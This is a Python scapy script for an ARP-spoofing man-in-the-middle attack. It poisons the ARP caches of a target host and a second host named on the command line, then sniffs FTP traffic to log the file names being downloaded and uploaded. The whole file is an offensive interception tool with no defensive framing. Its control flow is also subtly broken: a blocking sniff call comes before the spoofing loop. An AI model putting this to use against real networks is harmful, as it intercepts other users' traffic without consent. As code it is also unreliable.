import scapy.all as scapy
import sys
import time


if len(sys.argv) < 5:
	print("Error args")
	exit(1)


ip_src = sys.argv[1]
mac_src = sys.argv[2]
ip_target = sys.argv[3]
mac_target = sys.argv[4]


def restore_spoofing():
	print("Restoring default ARP..")
	packet = scapy.ARP(op=2, pdst=ip_target, hwdst=mac_target, psrc=ip_src, hwsrc=mac_src)
	scapy.send(packet, verbose=False)

	packet = scapy.ARP(op=2, pdst=ip_src, hwdst=mac_src, psrc=ip_target, hwsrc=mac_target)
	scapy.send(packet, verbose=False)


def spoofing(ip_dst, mac_dst, ip_src):
	arp_packet = scapy.ARP(op=2, hwdst=mac_dst, pdst=ip_dst, psrc=ip_src)
	ethernet_frame = scapy.Ether(dst=mac_dst) / arp_packet
	scapy.sendp(ethernet_frame, verbose=False)


def packet_callback(packet):
	if packet.haslayer(scapy.TCP) and packet.haslayer(scapy.Raw):
		payload = packet[scapy.Raw].load
		if b"RETR" in payload:
			print(f"Downloading: {payload.decode()[5:-2]}")
		elif b"STOR" in payload:
			print(f"Uploading: {payload.decode()[5:-2]}")


scapy.sniff(iface="eth0", prn=packet_callback, filter="tcp port 21")

try:
	while True:
		spoofing(ip_target, mac_target, ip_src)
		spoofing(ip_src, mac_src, ip_target)
		time.sleep(1)
except KeyboardInterrupt:
	restore_spoofing()
